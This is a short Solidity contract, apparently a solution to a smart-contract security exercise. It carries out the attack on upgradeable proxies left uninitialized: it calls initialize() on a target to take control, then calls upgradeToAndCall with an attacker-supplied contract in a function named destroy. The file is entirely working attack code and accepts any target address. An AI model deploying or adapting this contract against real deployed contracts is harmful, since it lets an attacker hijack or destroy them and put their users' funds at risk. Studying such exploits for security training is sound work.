// SPDX-License-Identifier: GPL-3.0

pragma solidity >=0.7.0 <0.9.0;


contract ExoTwentyFive {
    event logEvent(bool, bytes);

    function execute(address target) external {
        (bool success, bytes memory data) =  target.call(abi.encodeWithSignature("initialize()"));
        emit logEvent(success, data);
    }

    function destroy(address target, address attacker) external {
        (bool success, bytes memory data) =  target.call(abi.encodeWithSignature("upgradeToAndCall(address,bytes)",attacker, abi.encodeWithSignature("initialize()")));
emit logEvent(success, data);
        //(bool success, bytes memory data) = target.call(abi.encodeWithSignature("upgradeToAndCall(address,bytes)",attacker,abi.encodeWithSignature("initialize()")));
        //emit logEvent(success, data);
    }
}
